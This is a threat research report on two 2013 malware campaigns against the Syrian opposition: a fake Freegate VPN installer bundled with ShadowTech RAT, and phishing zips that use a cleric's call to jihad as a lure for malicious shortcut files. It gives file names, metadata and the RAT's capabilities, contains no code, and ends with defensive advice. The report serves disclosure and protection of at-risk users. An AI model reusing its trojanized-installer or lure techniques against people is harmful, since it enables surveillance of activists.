A Call to Harm:
New Malware Attacks Target the Syrian Opposition
Authors: John Scott-Railton and Morgan Marquis-Boire

SUMMARY OF KEY FINDINGS


Malware masquerading as the circumvention tool Freegate.



A campaign masquerading as a call to arms by a pro-opposition cleric.

INTRODUCTION
Syria’s opposition has faced persistent targeting by Pro-Government Electronic Actors (PGEAs) throughout
the Syrian civil war. A pro-government group calling itself the Syrian Electronic Army has gained visibility in
recent months with high profile attacks against news organizations. Meanwhile, Syrian activists continue to be
targeted with online attacks apparently for the purposes of accessing their private communications and stealing
their secrets.
Throughout 2012, attacks against the Syrian opposition were documented in an extensive series of blog posts
by Morgan Marquis-Boire and Eva Galperin with the help of the Electronic Frontier Foundation.1 Many others
have also contributed to research on Syrian malware, from Telecomix to a range of security companies.
Meanwhile, the Syrian opposition, and several groups working closely with it, such as Cyber Arabs, have been
active in attempting to identify potential threats and warn users.
Researchers have identified a common theme among the attacks against the Syrian opposition: sophisticated
social engineering that is grounded in an awareness of the needs, interests, and weaknesses of the opposition.
Attacks often play on curiosity or ideology to encourage users to enter passwords or click on enticing files, or
exploit fears of hacking and surveillance with fake security tools. Attacks are often transmitted to potential
victims from the accounts of people with whom they are familiar.

Number 18 – June 2013

The two attacks that are described in this blogpost follow this theme. One is a malicious installer of the
circumvention tool Freegate. The other is an e-mail attachment calling for jihad against Hezbollah and the
Assad regime or promising interesting regional news.

ATTACK 1: A HELPING OF MALWARE WITH THAT PROXY?
In this attack, which we first observed in the second week of June, the potential victim is encouraged to visit a
download link containing a malicious installer of Freegate.
Freegate is a standalone circumvention-bypassing Virtual Private Network (VPN) client for Windows.
Legitimate versions of the Freegate software are available for download on its website. While initially
developed for mainland Chinese users, the software is used in a number of other countries.
While Freegate was erroneously labelled a Trojan by one anti-virus company nearly a decade ago, in this
attack, attackers packaged what appears to be a legitimate version of Freegate with a malicious implant.2 The
targeted group were members of the Syrian opposition in a private social media group.
http://www.mediafire.com/download/[REDACTED]/VPN-Pro.zip

When a potential victim visits the link, they are offered the download of a file which MediaFire lists as
uploaded on June 15, 2013.
VPN-PRO.zip3
Uploaded: 2013-06-15 16:54:31

The zip file extracts to a MS Windows executable file.
VPN-Pro.exe4

Number 18 – June 2013

The binary was compiled at 2013-06-15 22:41:31 UTC and has the following properties:
LegalCopyright: Copyright © 2013
Assembly Version: 1.0.0.0
InternalName: VPN-Pro.exe
FileVersion: 1.0.0.0
ProductName: VPN-Pro
ProductVersion: 1.0.0.0
FileDescription: VPN-Pro
OriginalFilename: VPN-Pro.exe

Similar to previously observed malware attacks targeting the Syrian opposition, this was written in .NET and
appears to require the .NET 3.5 framework to execute.5
When VPN-Pro.exe is run, the victim is shown the Freegate end-user license agreement (EULA) dialogue
box.6 Upon agreeing to the EULA, an operational copy of Freegate proxy is launched, which includes a
request to unblock the firewall. The copy of Freegate launched is listed as “Freegate 7.35 Professional
Edition.” The Freegate software begins operating, and quickly prompts the user for an update.

ShadowTech Rat is a Remote Access Trojan which appears to be widely available for download on both
English and Arabic language sites. Videos can be found on YouTube demonstrating its functionality. The tool
offers a range of options to the attacker, from keylogging and remote activation of the webcam to file
exfiltration.

This is not the first time that malicious installer packages have been created for circumvention tools. In 2012,
malicious installers for Green Simurgh—a standalone proxy intended for Iranian users but also used by some
Syrians—were found in circulation. The creators of Green Simurgh responded by posting a prominent
warning on their website highlighting the presence of these malicious installers. Last year, malware which
purported to be the Tor Browser Bundle was found in the wild. It was found to be backdoored by Gh0st RAT
and exfiltrated data to an IP in China.
An attack using a malicious installer of a working and reputable security or proxy tool is especially pernicious
as it targets users who likely recognize the importance of privacy and circumvention, and may believe that
they have increased their privacy and security by installing the tool.

ATTACK 2: A TARGETED CALL TO ARMS
In this campaign, contact with targets was initiated through phishing e-mails, chat messages and Facebook
posts. Although we became aware of this campaign in early June, we have evidence that it may have started as
early as January 2013. We believe that this campaign targeted—at least in part—high-profile members of the
Syrian opposition. Interestingly, the attack included targeting of at least one non-public address associated
with internal opposition communications. This indicates some degree of prior penetration of the opposition—
either through computer network intrusion or other intelligence gathering activities.
The potential victim in this attack first receives a message from an unknown source, in this case, a Gmail
account with a nondescript name.
Example e-mail:

9

Number 18 – June 2013

The e-mail contains text, an image (not shown), and an attachment. The text refers to a video of Sheikh Adnan
al-Arour—a Sunni pro-opposition cleric—based in Saudi Arabia, calling for holy war against Assad and
Hezbollah. The user is led to believe that opening the zip file, which is descriptively titled as being the
Sheikh’s opinion, will provide access to the video.
While we have identified multiple different attacks with different zip files, the structure of all of these is
consistent with the example described here.
Example zip files:

‫ رأي ال ش يخ عدن ان ال عرعور ب اإلئ ت الف ال وط ني ال سوري‬.zip9
‫ راب ط – ال ش يخ عدن ان ال عرعور ي ع لن ال جهاد‬.zip
‫ ا صاب ة ال م ب عوث ال دول ي االخ ضر االب راه يمي ب ج لطة دماغ ية‬.zip
‫خاص جدا حول مجزرة ن هر ق وي ق وال م سؤول ال ح ق ي قي ع نها‬.zip

The zip file extracts to a Windows Shortcut file with the same name and a .lnk extension.
Example .lnk file “Sample A”:
‫ت الف ال عرعور عدن ان ال ش يخ‬

‫ال سوري ال وط ني ب اإلئ‬.lnk

CONCLUSIONS
As the conflict in Syria drags on, digital campaigns targeting Syrian opposition have persisted. We have
chosen to highlight two attacks that are part of recent efforts by Pro-Government Electronic Actors to
compromise opposition communications and steal their secrets.
These attacks cater to the opposition’s communication behaviors and tactics. They are indicative of a
combination of prior intelligence about the opposition, and ingenuity in social engineering. For example,
many in the Syrian opposition are now aware of the electronic threats they face and seek out tools to increase
their communications security and privacy. Tools and information about security and communications are in
constant circulation. Some of this material addresses well-defined vulnerabilities. We have observed a greater
degree of care among many in the opposition when facing certain situations that were common attack
modalities in 2012. As awareness grows and behavior evolves, we suspect that some of the attacks that we
regularly observed in 2012 are much less successful today.
Some of the information and practices that are shared between users, however, are much less appropriate, even
inadvertently dangerous. For example, many legitimate tools are shared via third party file sharing sites or
over social media. This situation presents a rich variety of targets for attackers in which to seed malicious
binaries and links masquerading as familiar or desirable tools.
We infer that from the point of view of these attackers, not all attacks need to have sophisticated malware in
order to be successful enough to be worth doing. Yet, perhaps in response to the growing awareness of
previous and often widely targeted attacks against the Syrian opposition, attackers continue to innovate and
15

Number 18 – June 2013

experiment with new techniques that blend social engineering with new attack styles. The experiments are
sometimes clearly successful. For example, in the case of Attack 2, the Windows shortcut files were not
conclusively identified as malicious by even savvy opposition members for an extended period of time.
We hope that this post will increase awareness of the two attacks among potential targets. In the meantime,
users who have executed either the fake Freegate file or clicked on one of the Windows shortcut files should
consider their computers and accounts compromised.

APPENDIX: RECOMMENDATIONS FOR FREEGATE AND FREEGATE USERS
The Freegate website is blocked in China (its primary target market), as is the case with other similar
circumvention tools. To get around blocking, tools are often distributed between individuals, or through
untrusted downloads from third party sites. This is an unfortunate vector for attackers to distribute malicious
installers and bundles that also contain functional versions of the program. As demonstrated by our work on
the Freegate malware, as well as the Green Simurgh case, these vulnerabilities are exploited with serious
consequences for high-risk users.
We understand the resource constraints that developers of free security and circumvention software often face.
As such, we propose two simple steps that Freegate could take to help mitigate the current and similar future
threats.


1) Freegate should take steps to make their users aware of the threat.
We provided Freegate developers with details of the attack, copies of the malicious binary, and other
details prior to publication. We would like to point them towards the example established by Green
Simurgh, who promptly posted a multilingual warning to their website when a malicious repackaging
of their tool was found to be targeting Syrian users. We have offered to help them translate any
warning materials into Arabic.



2) Freegate should implement by-default HTTPS on their website.
Currently, visitors to the Freegate website follow non-HTTPS links to an unencrypted download. We
believe that this presents a clear risk for man-in-the-middle attacks. Most developers of similar anticensorship, circumvention, and security tools have implemented this security measure. We encourage
Freegate to follow suit.
